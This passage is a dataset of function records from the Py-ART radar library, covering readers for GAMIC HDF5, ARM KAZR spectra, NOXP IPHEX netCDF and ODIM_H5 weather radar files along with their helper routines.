    for pw_name in pw_names:
        if gfile.is_attr_in_group('/scan0/how', pw_name):
            if pw_name == 'pulse_width':
                dic['data'] = gfile.sweep_expand(pulse_width[gfile.how_attrs(pw_name, 'int')[0]] * 1e-06)
            else:
                dic['data'] = gfile.sweep_expand(gfile.how_attrs(pw_name, 'float32') * 1e-06)
            break
    instrument_params['pulse_width'] = dic
    dic = filemetadata('prt')
    dic['data'] = gfile.sweep_expand(1.0 / gfile.how_attrs('PRF', 'float32'))
    instrument_params['prt'] = dic
    unfolding = gfile.how_attrs('unfolding', 'int32')
    dic = filemetadata('prt_mode')
    dic['data'] = np.array([_prt_mode_from_unfolding(i) for i in unfolding])
    instrument_params['prt_mode'] = dic
    dic = filemetadata('prt_ratio')
    dic['data'] = gfile.sweep_expand([[1, 2.0 / 3.0, 3.0 / 4.0, 4.0 / 5.0][i] for i in unfolding])
    instrument_params['prt_ratio'] = dic
    dic = filemetadata('unambiguous_range')
    dic['data'] = gfile.sweep_expand(gfile.how_attrs('range', 'float32'))
    instrument_params['unambiguous_range'] = dic
    if gfile.is_attr_in_group('/scan0/how/extended', 'nyquist_velocity'):
        dic = filemetadata('nyquist_velocity')
        dic['data'] = gfile.sweep_expand(gfile.how_ext_attrs('nyquist_velocity'))
        instrument_params['nyquist_velocity'] = dic
    dic = filemetadata('n_samples')
    dic['data'] = gfile.sweep_expand(gfile.how_attrs('range_samples', 'int32') * gfile.how_attrs('time_samples', 'int32'), dtype='int32')
    instrument_params['n_samples'] = dic
    return instrument_params"
ARM-DOE/pyart,_avg_radial_angles,"def _avg_radial_angles(angle1, angle2):
    """"""Return the average angle between two radial angles.""""""
    return np.angle((np.exp(1j * np.deg2rad(angle1)) + np.exp(1j * np.deg2rad(angle2))) / 2.0, deg=True)"
ARM-DOE/pyart,_prt_mode_from_unfolding,"def _prt_mode_from_unfolding(unfolding):
    """"""Return 'fixed' or 'staggered' depending on unfolding flag""""""
    if unfolding == 0:
        return 'fixed'
    else:
        return 'staggered'"
ARM-DOE/pyart,_get_gamic_sweep_data,"def _get_gamic_sweep_data(group):
    """"""Get GAMIC HDF5 sweep data from an HDF5 group.""""""
    dyn_range_min = group.attrs['dyn_range_min']
    dyn_range_max = group.attrs['dyn_range_max']
    raw_data = group[:]
    fmt = group.attrs['format']
    if hasattr(fmt, 'decode'):
        fmt = fmt.decode('UTF-8')
    if fmt == 'UV16':
        assert raw_data.dtype == np.uint16
        scale = (dyn_range_max - dyn_range_min) / 65535.0
        offset = dyn_range_min
        sweep_data = np.ma.masked_array(raw_data * scale + offset, mask=raw_data == 0, dtype='float32')
    elif fmt == 'UV8':
        assert raw_data.dtype == np.uint8
        scale = (dyn_range_max - dyn_range_min) / 255.0
        offset = dyn_range_min
        sweep_data = np.ma.masked_array(raw_data * scale + offset, mask=raw_data == 0, dtype='float32')
    elif fmt == 'F':
        assert raw_data.dtype.type == np.float32
        sweep_data = np.ma.masked_array(raw_data, mask=np.isnan(raw_data), dtype='float32')
    else:
        raise NotImplementedError('GAMIC data format: %s', fmt)
    return sweep_data"
ARM-DOE/pyart,__init__,"def __init__(self, filename):
    """"""initialize object.""""""
    self._hfile = h5py.File(filename, 'r')
    self.nsweeps = self._hfile['what'].attrs['sets']
    self._scans = ['scan%i' % i for i in range(self.nsweeps)]
    self.rays_per_sweep = self.how_attrs('ray_count', 'int32')
    self.total_rays = sum(self.rays_per_sweep)
    self.gates_per_sweep = self.how_attrs('bin_count', 'int32')
    self.max_num_gates = max(self.gates_per_sweep)
    range_samples = self.how_attrs('range_samples', 'int32')
    range_step = self.how_attrs('range_step', 'float') * range_samples
    if len(np.unique(range_step)) > 1:
        raise ValueError('range scale changes between sweeps')
    self.start_ray = np.cumsum(np.append([0], self.rays_per_sweep[:-1]))
    self.end_ray = np.cumsum(self.rays_per_sweep) - 1
    return"
ARM-DOE/pyart,close,"def close(self):
    """"""Close the file.""""""
    self._hfile.close()"
ARM-DOE/pyart,is_file_complete,"def is_file_complete(self):
    """"""True if all scans in file, False otherwise.""""""
    for scan in self._scans:
        if scan not in self._hfile:
            return False
    return True"
ARM-DOE/pyart,is_file_single_scan_type,"def is_file_single_scan_type(self):
    """"""True is all scans are the same scan type, False otherwise.""""""
    scan_type = self._hfile['scan0/what'].attrs['scan_type']
    for scan in self._scans:
        if self._hfile[scan]['what'].attrs['scan_type'] != scan_type:
            return False
    return True"
ARM-DOE/pyart,where_attr,"def where_attr(self, attr, dtype):
    """"""Return an array containing a attribute from the where group.""""""
    return np.array([self._hfile['where'].attrs[attr]], dtype=dtype)"
ARM-DOE/pyart,how_attr,"def how_attr(self, attr, dtype):
    """"""Return an array containing a attribute from the how group.""""""
    return np.array([self._hfile['how'].attrs[attr]], dtype=dtype)"
ARM-DOE/pyart,is_attr_in_group,"def is_attr_in_group(self, group, attr):
    """"""True is attribute is present in the group, False otherwise.""""""
    return attr in self._hfile[group].attrs"
ARM-DOE/pyart,raw_group_attr,"def raw_group_attr(self, group, attr):
    """"""Return an attribute from a group with no reformatting.""""""
    return self._hfile[group].attrs[attr]"
ARM-DOE/pyart,raw_scan0_group_attr,"def raw_scan0_group_attr(self, group, attr):
    """"""Return an attribute from the scan0 group with no reformatting.""""""
    return self._hfile['/scan0'][group].attrs[attr]"
ARM-DOE/pyart,how_attrs,"def how_attrs(self, attr, dtype):
    """"""Return an array of an attribute for each scan's how group.""""""
    return np.array([self._hfile[s]['how'].attrs[attr] for s in self._scans], dtype=dtype)"
ARM-DOE/pyart,how_ext_attrs,"def how_ext_attrs(self, attr):
    """"""
        Return a list of an attribute in each scan's how/extended group.
        """"""
    return [float(self._hfile[s]['how']['extended'].attrs[attr]) for s in self._scans]"
ARM-DOE/pyart,what_attrs,"def what_attrs(self, attr, dtype):
    """"""Return a list of an attribute for each scan's what group.""""""
    return np.array([self._hfile[s]['what'].attrs[attr] for s in self._scans], dtype=dtype)"
ARM-DOE/pyart,moment_groups,"def moment_groups(self):
    """"""Return a list of groups under scan0 where moments are stored.""""""
    return [k for k in self._hfile['/scan0'] if k.startswith('moment_')]"
ARM-DOE/pyart,moment_names,"def moment_names(self, scan0_groups):
    """"""Return a list of moment names for a list of scan0 groups.""""""
    if hasattr(self._hfile['/scan0'][scan0_groups[0]].attrs['moment'], 'decode'):
        return [self._hfile['/scan0'][k].attrs['moment'].decode('utf-8') for k in scan0_groups]
    else:
        return [self._hfile['/scan0'][k].attrs['moment'] for k in scan0_groups]"
ARM-DOE/pyart,is_field_in_ray_header,"def is_field_in_ray_header(self, field):
    """"""True if field is present in ray_header, False otherwise.""""""
    return field in self._hfile[self._scans[0]]['ray_header'].dtype.names"
ARM-DOE/pyart,ray_header,"def ray_header(self, field, dtype):
    """"""Return an array containing a ray_header field for each sweep.""""""
    data = np.empty((self.total_rays,), dtype=dtype)
    for (scan, start, end) in zip(self._scans, self.start_ray, self.end_ray):
        data[start:end + 1] = self._hfile[scan]['ray_header'][field]
    return data"
ARM-DOE/pyart,moment_data,"def moment_data(self, group, dtype):
    """"""Read in moment data from all sweeps.""""""
    data = np.ma.zeros((self.total_rays, self.max_num_gates), dtype=dtype)
    data[:] = np.ma.masked
    for (scan, start, end) in zip(self._scans, self.start_ray, self.end_ray):
        if group in self._hfile[scan]:
            sweep_data = _get_gamic_sweep_data(self._hfile[scan][group])
            data[start:end + 1, :sweep_data.shape[1]] = sweep_data[:]
    return data"
ARM-DOE/pyart,sweep_expand,"def sweep_expand(self, arr, dtype='float32'):
    """"""Expand an sweep indexed array to be ray indexed""""""
    return np.repeat(arr, self.rays_per_sweep).astype(dtype)"
ARM-DOE/pyart,read_kazr_spectra,"def read_kazr_spectra(filename, field_names=None, additional_metadata=None, file_field_names=False, exclude_fields=None, include_fields=None, **kwargs):
    """"""
    Read a ARM KAZR spectra netCDF file.

    Parameters
    ----------
    filename : str
        Name of KAZR spectra netCDF file to read data from.
    field_names : dict, optional
        Dictionary mapping field names in the file names to radar_spectra field names.
        Unlike other read functions, fields not in this dictionary or having a
        value of None are still included in the radar_spectra.fields dictionary, to
        exclude them use the `exclude_fields` parameter. Fields which are
        mapped by this dictionary will be renamed from key to value.
    additional_metadata : dict of dicts, optional
        This parameter is not used, it is included for uniformity.
    file_field_names : bool, optional
        True to force the use of the field names from the file in which
        case the `field_names` parameter is ignored. False will use to
        `field_names` parameter to rename fields.
    exclude_fields : list or None, optional
        List of fields to exclude from the radar spectra object. This is applied
        after the `file_field_names` and `field_names` parameters. Set
        to None to include all fields specified by include_fields.
    include_fields : list or None, optional
        List of fields to include from the radar spectra object. This is applied
        after the `file_field_names` and `field_names` parameters. Set
        to None to include all fields not specified by exclude_fields.
    delay_field_loading : bool
        True to delay loading of field data from the file until the 'data'
        key in a particular field dictionary is accessed. In this case
        the field attribute of the returned RadarSpectra object will contain
        LazyLoadDict objects not dict objects. Delayed field loading will not
        provide any speedup in file where the number of gates vary between
        rays (ngates_vary=True) and is not recommended.

    Returns
    -------
    radar_spectra : RadarSpectra
        RadarSpectra object.

    """"""
    if not _XARRAY_AVAILABLE:
        raise MissingOptionalDependency('Xarray is required to read KAZR spectra files but is not installed!')
    _test_arguments(kwargs)
    if field_names is None:
        field_names = KAZR_SPECTRA_FIELD_NAMES
    filemetadata = FileMetadata('kazr_spectra', field_names, additional_metadata, file_field_names, exclude_fields)
    xrobj = xr.open_dataset(filename)
    try:
        times = [datetime.timedelta(seconds=sec) + datetime.datetime.utcfromtimestamp(xrobj.base_time.values.astype('O') / 1000000000.0) for sec in xrobj.time_offset.values]
    except TypeError:
        ts = [(i - np.datetime64('1970-01-01T00:00:00Z')) / np.timedelta64(1, 's') for i in xrobj.time_offset.values]
        bs = (xrobj.base_time.values - np.datetime64('1970-01-01T00:00:00Z')) / np.timedelta64(1, 's')
        times = [datetime.timedelta(seconds=sec) + datetime.datetime.utcfromtimestamp(bs.astype('O') / 1000000000.0) for sec in ts]
    times = np.array(times)
    time_dict = filemetadata('time')
    base_time = 'seconds since ' + datetime.datetime.strftime(times[0], '%Y-%m-%DT%H:%M:%SZ')
    time_array = [(x - times[0]).seconds for x in times]
    time_dict['units'] = base_time
    time = xr.DataArray(np.array(time_array), attrs=time_dict, dims='time')
    rng_array = np.squeeze(xrobj.range.values)
    rng_dict = filemetadata('range')
    _range = xr.DataArray(rng_array, attrs=rng_dict, dims='range')
    if 'nsa' in filename:
        xrobj.attrs['site_id'] = 'nsa'
    elif 'ena' in filename:
        xrobj.attrs['site_id'] = 'ena'
    else:
        xrobj.attrs['site_id'] = 'sgp'
    lat_dict = filemetadata('latitude')
    lon_dict = filemetadata('longitude')
    alt_dict = filemetadata('altitude')
    (lat, lon, alt) = get_kazr_location(xrobj.attrs['site_id'])
    latitude = xr.DataArray(np.array(lat, dtype='float32'), attrs=lat_dict)
    longitude = xr.DataArray(np.array(lon, dtype='float32'), attrs=lon_dict)
    altitude = xr.DataArray(np.array(alt, dtype='float32'), attrs=alt_dict)
    elevation_dict = filemetadata('elevation')
    elevation = xr.DataArray(np.array(90.0 * np.ones(len(time_array)), dtype='float32'), attrs=elevation_dict, dims='time')
    azimuth_dict = filemetadata('azimuth')
    azimuth = xr.DataArray(np.array(360.0 * np.ones(len(time_array)), dtype='float32'), attrs=azimuth_dict, dims='time')
    fix_agl_dict = filemetadata('fixed_angle')
    fixed_angle = xr.DataArray(np.array(90.0, dtype='float32'), attrs=fix_agl_dict)
    sweep_number_dict = filemetadata('sweep_number')
    sweep_number = xr.DataArray(np.array([1], dtype='int32'), attrs=sweep_number_dict)
    sweep_mode_dict = filemetadata('sweep_mode')
    sweep_mode = xr.DataArray(np.array('spectra'), attrs=sweep_mode_dict)
    sweep_start_ray_index_dict = filemetadata('sweep_start_ray_index')
    sweep_start_ray_index = xr.DataArray(np.array([0], dtype='int32'), attrs=sweep_start_ray_index_dict)
    sweep_end_ray_index_dict = filemetadata('sweep_end_ray_index')
    sweep_end_ray_index = xr.DataArray(np.array([len(times) - 1], dtype='int32'), attrs=sweep_end_ray_index_dict)
    spectra_array = [_get_spectra(xrobj, x) for x in xrobj.time.values]
    spectras = np.stack(spectra_array)
    c = 299792458
    npulses_max = xrobj.speclength.values
    wavelength = c / float(re.findall('[-+]?\\d*\\.\\d+|\\d+', xrobj.radar_operating_frequency)[0]) * 1e-09
    scan_type = 'vpt'
    metadata = xrobj.attrs
    metadata['wavelength'] = wavelength
    velocity_dict = xrobj.velocity_bins.attrs
    bins = xrobj.velocity_bins.values
    velocity_bins = xr.DataArray(bins, attrs=velocity_dict, dims='npulses_max')
    xrobj.close()
    return RadarSpectra(time, _range, spectras, metadata, scan_type, latitude, longitude, altitude, sweep_number, sweep_mode, fixed_angle, sweep_start_ray_index, sweep_end_ray_index, azimuth, elevation, npulses_max, velocity_bins)"
ARM-DOE/pyart,_get_spectra,"def _get_spectra(xrobj, time):
    """"""Retrieves the spectra values using time and locator mask.""""""
    the_spectra_locs = xrobj.locator_mask.sel(time=time).values
    the_spectra_loc = np.zeros((len(the_spectra_locs), len(xrobj.speclength.values)))
    the_spectra_locs[np.isnan(the_spectra_locs)] = -9999.0
    for (i, locs) in enumerate(the_spectra_locs):
        if locs != -9999.0:
            the_spectra_loc[i, :] = xrobj.spectra.values[int(locs), :]
        else:
            the_spectra_loc[i, :] = np.nan * np.ones(len(xrobj.speclength.values))
    return the_spectra_loc"
ARM-DOE/pyart,get_kazr_location,"def get_kazr_location(arm_site):
    """"""
    Return the latitude, longitude and altitude of a ARM KAZR Radar.

    Parameters
    ----------
    arm_site : str
        Three letter ARM site acroynm.

    Returns
    -------
    lat, lon, alt : float
        Latitude (in degrees), longitude (in degrees), and altitude
        (in meters above mean sea level) of the KAZR radar.

    """"""
    loc = ARM_SITES[arm_site.upper()]
    return (loc['lat'], loc['lon'], loc['alt'])"
ARM-DOE/pyart,read_noxp_iphex_nc,"def read_noxp_iphex_nc(filename, field_names=None, additional_metadata=None, file_field_names=False, exclude_fields=None, include_fields=None, **kwargs):
    """"""
    Read a NOXP IPHEX netCDF file.

    Parameters
    ----------
    filename : str
        Name of the netCDF file to read.
    field_names : dict, optional
        Dictionary mapping netCDF field names to radar field names. If a
        data type found in the file does not appear in this dictionary or has
        a value of None it will not be placed in the radar.fields dictionary.
        A value of None, the default, will use the mapping defined in the
        Py-ART configuration file.
    additional_metadata : dict of dicts, optional
        Dictionary of dictionaries to retrieve metadata from during this read.
        This metadata is not used during any successive file reads unless
        explicitly included.  A value of None, the default, will not
        introduct any addition metadata and the file specific or default
        metadata as specified by the Py-ART configuration file will be used.
    file_field_names : bool, optional
        True to use the netCDF data type names for the field names. If this
        case the field_names parameter is ignored. The field dictionary will
        likely only have a 'data' key, unless the fields are defined in
        `additional_metadata`.
    exclude_fields : list or None, optional
        List of fields to exclude from the radar object. This is applied
        after the `file_field_names` and `field_names` parameters. Set
        to None to include all fields specified by include_fields.
    include_fields : list or None, optional
        List of fields to include from the radar object. This is applied
        after the `file_field_names` and `field_names` parameters. Set
        to None to include all fields not specified by exclude_fields.

    Returns
    -------
    radar : Radar
        Radar object containing data from netCDF file.

    """"""
    if field_names is None:
        field_names = NOXP_FIELD_NAMES
    filemetadata = FileMetadata('cfradial', field_names, additional_metadata, file_field_names, exclude_fields, include_fields)
    ncobj = netCDF4.Dataset(filename)
    ncvars = ncobj.variables
    nsweeps = 1
    latitude = filemetadata('latitude')
    longitude = filemetadata('longitude')
    altitude = filemetadata('altitude')
    latitude['data'] = np.array(ncvars['Latitude'])
    longitude['data'] = np.array(ncvars['Longitude'])
    altitude['data'] = np.array(ncvars['Altitude'])
    metadata = filemetadata('metadata')
    metadata['source'] = 'NOAA NSSL'
    metadata['original_container'] = 'noxp_iphex_nc'
    metadata['system'] = ncobj.Radar
    sweep_start_ray_index = filemetadata('sweep_start_ray_index')
    sweep_end_ray_index = filemetadata('sweep_end_ray_index')
    rays_per_sweep = np.shape(ncvars['AZ'][:])
    ssri = np.cumsum(np.append([0], rays_per_sweep[:-1])).astype('int32')
    seri = np.cumsum(rays_per_sweep).astype('int32') - 1
    sweep_start_ray_index['data'] = ssri
    sweep_end_ray_index['data'] = seri
    sweep_number = filemetadata('sweep_number')
    sweep_number['data'] = np.arange(nsweeps, dtype='int32')
    sweep_mode = filemetadata('sweep_mode')
    scan_type = getattr(ncobj, 'Scan type').lower()
    if scan_type in ['ppi', 'rhi']:
        sweep_mode['data'] = np.array(nsweeps * ['manual_' + scan_type])
    else:
        sweep_mode['data'] = np.array(nsweeps * ['pointing'])
    fixed_angle = filemetadata('fixed_angle')
    if scan_type == 'rhi':
        sweep_el = ncvars['AZ'][0]
    else:
        sweep_el = ncvars['EL'][0]
    fixed_angle['data'] = np.array([sweep_el], dtype='float32')
    elevation = filemetadata('elevation')
    elevation['data'] = np.array(ncvars['EL'])
    _range = filemetadata('range')
    rng = 1000.0 * ncvars['Range'][:].T
    _range['data'] = rng[0]
    _range['meters_to_center_of_first_gate'] = np.mean(rng[0][0:2])
    _range['meters_between_gates'] = np.median(np.diff(_range['data']))
    _range['spacing_is_constant'] = 0
    azimuth = filemetadata('azimuth')
    azimuth['data'] = np.array(ncvars['AZ'])
    _time = filemetadata('time')
    frac_since_basetime = ncvars['time'][0] - 735762.0
    start_time = datetime.datetime(2014, 6, 3) + datetime.timedelta(frac_since_basetime)
    _time['units'] = make_time_unit_str(start_time)
    _time['data'] = 3600.0 * 24.0 * (ncvars['time'][:] - ncvars['time'][0]).astype('float32')
    keys = [k for (k, v) in ncvars.items() if v.dimensions == ('Gate', 'Time') and k not in ['Range', 'Distance', 'Height']]
    fields = {}
    for key in keys:
        field_name = filemetadata.get_field_name(key)
        if field_name is None:
            if exclude_fields is not None and key in exclude_fields:
                continue
            if include_fields is not None and key not in include_fields:
                continue
            field_name = key
        fields[field_name] = _ncvar_to_dict(ncvars[key])
    instrument_parameters = {}
    prt = filemetadata('prt')
    prt['data'] = 1.0 / float(ncobj.PRF[0:5])
    instrument_parameters['prt'] = prt
    frequency = filemetadata('frequency')
    frequency['frequency'] = float(ncobj.Frequency[0:4]) * 10000000000.0
    instrument_parameters['frequency'] = frequency
    hits = filemetadata('n_samples')
    hits['data'] = ncobj.Hits
    instrument_parameters['hits'] = hits
    return Radar(_time, _range, fields, metadata, scan_type, latitude, longitude, altitude, sweep_number, sweep_mode, fixed_angle, sweep_start_ray_index, sweep_end_ray_index, azimuth, elevation, instrument_parameters=instrument_parameters)"
ARM-DOE/pyart,_ncvar_to_dict,"def _ncvar_to_dict(ncvar):
    """"""Convert a NetCDF Dataset variable to a dictionary.""""""
    d = {k: getattr(ncvar, k) for k in ncvar.ncattrs() if k not in ['scale_factor', 'add_offset']}
    d['data'] = ncvar[:].T
    if np.isscalar(d['data']):
        d['data'] = np.array(d['data'])
        d['data'].shape = (1,)
    return d"
ARM-DOE/pyart,read_odim_h5,"def read_odim_h5(filename, field_names=None, additional_metadata=None, file_field_names=False, exclude_fields=None, include_fields=None, include_datasets=None, exclude_datasets=None, **kwargs):
    """"""
    Read a ODIM_H5 file.

    Parameters
    ----------
    filename : str
        Name of the ODIM_H5 file to read.
    field_names : dict, optional
        Dictionary mapping ODIM_H5 field names to radar field names. If a
        data type found in the file does not appear in this dictionary or has
        a value of None it will not be placed in the radar.fields dictionary.
        A value of None, the default, will use the mapping defined in the
        Py-ART configuration file.
    additional_metadata : dict of dicts, optional
        Dictionary of dictionaries to retrieve metadata from during this read.
        This metadata is not used during any successive file reads unless
        explicitly included.  A value of None, the default, will not
        introduct any addition metadata and the file specific or default
        metadata as specified by the Py-ART configuration file will be used.
    file_field_names : bool, optional
        True to use the MDV data type names for the field names. If this
        case the field_names parameter is ignored. The field dictionary will
        likely only have a 'data' key, unless the fields are defined in
        `additional_metadata`.
    exclude_fields : list or None, optional
        List of fields to exclude from the radar object. This is applied
        after the `file_field_names` and `field_names` parameters. Set
        to None to include all fields specified by include_fields.
    include_fields : list or None, optional
        List of fields to include from the radar object. This is applied
        after the `file_field_names` and `field_names` parameters. Set
        to None to include all fields not specified by exclude_fields.
    include_datasets : list or None, optional
        List of datasets to include from the HDF5 file, given
        as [""dataset1"", ""dataset2"", ...]. Set to None to include all datasets
        not specified by exclude_datasets.
    exclude_datasets : list or None, optional
        List of datasets to exclude from the HDF5 file, given
        as [""dataset1"", ""dataset2"", ...]. Set to None to include all datasets
        specified by include_datasets.

    Returns
    -------
    radar : Radar
        Radar object containing data from ODIM_H5 file.

    """"""
    if not _H5PY_AVAILABLE:
        raise MissingOptionalDependency('h5py is required to use read_odim_h5 but is not installed')
    _test_arguments(kwargs)
    if field_names is None:
        field_names = ODIM_H5_FIELD_NAMES
    filemetadata = FileMetadata('odim_h5', field_names, additional_metadata, file_field_names, exclude_fields, include_fields)
    with h5py.File(filename, 'r') as hfile:
        odim_object = _to_str(hfile['what'].attrs['object'])
        if odim_object not in ['PVOL', 'SCAN', 'ELEV', 'AZIM']:
            raise NotImplementedError('object: %s not implemented.' % odim_object)
        if include_datasets is not None:
            datasets = [k for k in hfile if k.startswith('dataset') and k in include_datasets]
        elif exclude_datasets is not None:
            datasets = [k for k in hfile if k.startswith('dataset') and k not in exclude_datasets]
        else:
            datasets = [k for k in hfile if k.startswith('dataset')]
        datasets.sort(key=lambda x: int(x[7:]))
        nsweeps = len(datasets)
        latitude = filemetadata('latitude')
        longitude = filemetadata('longitude')
        altitude = filemetadata('altitude')
        h_where = hfile['where'].attrs
        latitude['data'] = np.array([h_where['lat']], dtype='float64')
        longitude['data'] = np.array([h_where['lon']], dtype='float64')
        altitude['data'] = np.array([h_where['height']], dtype='float64')
        metadata = filemetadata('metadata')
        metadata['source'] = _to_str(hfile['what'].attrs['source'])
        metadata['original_container'] = 'odim_h5'
        metadata['odim_conventions'] = _to_str(hfile.attrs['Conventions'])
        h_what = hfile['what'].attrs
        metadata['version'] = _to_str(h_what['version'])
        metadata['source'] = _to_str(h_what['source'])
        try:
            ds1_how = hfile[datasets[0]]['how'].attrs
        except KeyError:
            ds1_how = {}
        if 'system' in ds1_how:
            metadata['system'] = ds1_how['system']
        if 'software' in ds1_how:
            metadata['software'] = ds1_how['software']
        if 'sw_version' in ds1_how:
            metadata['sw_version'] = ds1_how['sw_version']
        sweep_start_ray_index = filemetadata('sweep_start_ray_index')
        sweep_end_ray_index = filemetadata('sweep_end_ray_index')
        if odim_object in ['AZIM', 'SCAN', 'PVOL']:
            rays_per_sweep = [int(hfile[d]['where'].attrs['nrays']) for d in datasets]
        elif odim_object == 'ELEV':
            rays_per_sweep = [int(hfile[d]['where'].attrs['angles'].size) for d in datasets]
        total_rays = sum(rays_per_sweep)
        ssri = np.cumsum(np.append([0], rays_per_sweep[:-1])).astype('int32')
        seri = np.cumsum(rays_per_sweep).astype('int32') - 1
        sweep_start_ray_index['data'] = ssri
        sweep_end_ray_index['data'] = seri
        sweep_number = filemetadata('sweep_number')
        sweep_number['data'] = np.arange(nsweeps, dtype='int32')
        sweep_mode = filemetadata('sweep_mode')
        sweep_mode['data'] = np.array(nsweeps * ['azimuth_surveillance'])
        if odim_object == 'ELEV':
            scan_type = 'rhi'
        else:
            scan_type = 'ppi'
        fixed_angle = filemetadata('fixed_angle')
        if odim_object == 'ELEV':
            sweep_el = [hfile[d]['where'].attrs['az_angle'] for d in datasets]
        else:
            sweep_el = [hfile[d]['where'].attrs['elangle'] for d in datasets]
        fixed_angle['data'] = np.array(sweep_el, dtype='float32')
        elevation = filemetadata('elevation')
        if 'elangles' in ds1_how:
            edata = np.empty(total_rays, dtype='float32')
            for (d, start, stop) in zip(datasets, ssri, seri):
                edata[start:stop + 1] = hfile[d]['how'].attrs['elangles'][:]
            elevation['data'] = edata
        elif odim_object == 'ELEV':
            edata = np.empty(total_rays, dtype='float32')
            for (d, start, stop) in zip(datasets, ssri, seri):
                edata[start:stop + 1] = hfile[d]['where'].attrs['angles'][:]
            elevation['data'] = edata
        else:
            elevation['data'] = np.repeat(sweep_el, rays_per_sweep)
        _range = filemetadata('range')
        if 'rstart' in hfile['dataset1/where'].attrs:
            rstart = [hfile[d]['where'].attrs['rstart'] for d in datasets]
            if any(rstart != rstart[0]):
                raise ValueError('range start changes between sweeps')
            rscale = [hfile[d]['where'].attrs['rscale'] for d in datasets]
            if any(rscale != rscale[0]):
                raise ValueError('range scale changes between sweeps')
            all_sweeps_nbins = [hfile[d]['where'].attrs['nbins'] for d in datasets]
            max_nbins = max(all_sweeps_nbins)
            if isinstance(max_nbins, np.ndarray):
                max_nbins = max_nbins[0]
            else:
                max_nbins = max(all_sweeps_nbins)
            rscenter = 1000.0 * rstart[0] + rscale[0] / 2
            _range['data'] = np.arange(rscenter, rscenter + max_nbins * rscale[0], rscale[0], dtype='float32')
            _range['meters_to_center_of_first_gate'] = rstart[0] * 1000.0
            _range['meters_between_gates'] = float(rscale[0])
        else:
            max_range = [hfile[d]['where'].attrs['range'] for d in datasets]
            if any(max_range != max_range[0]):
                raise ValueError('maximum range changes between sweeps')
            nbins = hfile['dataset1/data1/data'].shape[1]
            _range['data'] = np.linspace(0, max_range[0] * 1000.0, nbins).astype('float32')
            _range['meters_to_center_of_first_gate'] = 0
            _range['meters_between_gates'] = max_range[0] * 1000.0 / nbins
        azimuth = filemetadata('azimuth')
        az_data = np.ones((total_rays,), dtype='float32')
        for (dset, start, stop) in zip(datasets, ssri, seri):
            if odim_object == 'ELEV':
                sweep_az = hfile[dset]['where'].attrs['az_angle']
            elif odim_object == 'AZIM':
                startaz = hfile[dset]['where'].attrs['startaz']
                stopaz = hfile[dset]['where'].attrs['stopaz']
                nrays = stop - start + 1
                sweep_az = np.linspace(startaz, stopaz, nrays, endpoint=True)
            elif 'startazA' in ds1_how and 'stopazA' in ds1_how:
                startaz = hfile[dset]['how'].attrs['startazA']
                stopaz = hfile[dset]['how'].attrs['stopazA']
                sweep_az = np.angle((np.exp(1j * np.deg2rad(startaz)) + np.exp(1j * np.deg2rad(stopaz))) / 2.0, deg=True)
            else:
                try:
                    astart = hfile[dset]['how'].attrs['astart']
                except KeyError:
                    astart = 0.0
                nrays = hfile[dset]['where'].attrs['nrays']
                da = 360.0 / nrays
                sweep_az = np.arange(astart + da / 2.0, 360.0, da, dtype='float32')
            az_data[start:stop + 1] = sweep_az
        azimuth['data'] = az_data
        _time = filemetadata('time')
        if 'startazT' in ds1_how and 'stopazT' in ds1_how:
            t_data = np.empty((total_rays,), dtype='float64')
            for (dset, start, stop) in zip(datasets, ssri, seri):
                t_start = hfile[dset]['how'].attrs['startazT']
                t_stop = hfile[dset]['how'].attrs['stopazT']
                t_data[start:stop + 1] = (t_start + t_stop) / 2
            start_epoch = t_data.min()
            start_time = datetime.datetime.utcfromtimestamp(start_epoch)
            _time['units'] = make_time_unit_str(start_time)
            _time['data'] = t_data - start_epoch
        else:
            t_data = np.empty((total_rays,), dtype='int32')
            for (dset, start, stop) in zip(datasets, ssri, seri):
                dset_what = hfile[dset]['what'].attrs
                start_str = _to_str(dset_what['startdate'] + dset_what['starttime'])
                end_str = _to_str(dset_what['enddate'] + dset_what['endtime'])
                start_dt = datetime.datetime.strptime(start_str, '%Y%m%d%H%M%S')
                end_dt = datetime.datetime.strptime(end_str, '%Y%m%d%H%M%S')
                time_delta = end_dt - start_dt
                delta_seconds = time_delta.seconds + time_delta.days * 3600 * 24
                rays = stop - start + 1
                sweep_start_epoch = (start_dt - datetime.datetime(1970, 1, 1)).total_seconds()
                t_data[start:stop + 1] = sweep_start_epoch + np.linspace(0, delta_seconds, rays)
            start_epoch = t_data.min()
            start_time = datetime.datetime.utcfromtimestamp(start_epoch)
            _time['units'] = make_time_unit_str(start_time)
            _time['data'] = (t_data - start_epoch).astype('float32')
        fields = {}
        h_field_keys = [k for k in hfile['dataset1'] if k.startswith('data')]
        odim_fields = [hfile['dataset1'][d]['what'].attrs['quantity'] for d in h_field_keys]
        for (odim_field, h_field_key) in zip(odim_fields, h_field_keys):
            field_name = filemetadata.get_field_name(_to_str(odim_field))
            if field_name is None:
                continue
            fdata = np.ma.zeros((total_rays, max_nbins), dtype='float32')
            start = 0
            for (dset, rays_in_sweep) in zip(datasets, rays_per_sweep):
                try:
                    sweep_data = _get_odim_h5_sweep_data(hfile[dset][h_field_key])
                except KeyError:
                    sweep_data = np.zeros((rays_in_sweep, max_nbins)) + np.NaN
                sweep_nbins = sweep_data.shape[1]
                fdata[start:start + rays_in_sweep, :sweep_nbins] = sweep_data[:]
                fdata[start:start + rays_in_sweep, sweep_nbins:max_nbins] = np.nan
                start += rays_in_sweep
            field_dic = filemetadata(field_name)
            field_dic['data'] = fdata
            field_dic['_FillValue'] = get_fillvalue()
            fields[field_name] = field_dic
    instrument_parameters = None
    return Radar(_time, _range, fields, metadata, scan_type, latitude, longitude, altitude, sweep_number, sweep_mode, fixed_angle, sweep_start_ray_index, sweep_end_ray_index, azimuth, elevation, instrument_parameters=instrument_parameters)"
ARM-DOE/pyart,_to_str,"def _to_str(text):
    """"""Convert bytes to str if necessary.""""""
    if hasattr(text, 'decode'):
        return text.decode('utf-8')
    else:
        return text"
ARM-DOE/pyart,_get_odim_h5_sweep_data,"def _get_odim_h5_sweep_data(group):
    """"""Get ODIM_H5 sweet data from an HDF5 group.""""""
    what = group['what']
    raw_data = group['data'][:]
    if 'nodata' in what.attrs:
        nodata = what.attrs.get('nodata')
        data = np.ma.masked_equal(raw_data, nodata)
    else:
        data = np.ma.masked_array(raw_data)
    if 'undetect' in what.attrs:
        undetect = what.attrs.get('undetect')
        data[data == undetect] = np.ma.masked
    offset = 0.0
    gain = 1.0
    if 'offset' in what.attrs:
        offset = what.attrs.get('offset')
    if 'gain' in what.attrs:
        gain = what.attrs.get('gain')
    return data * gain + offset"
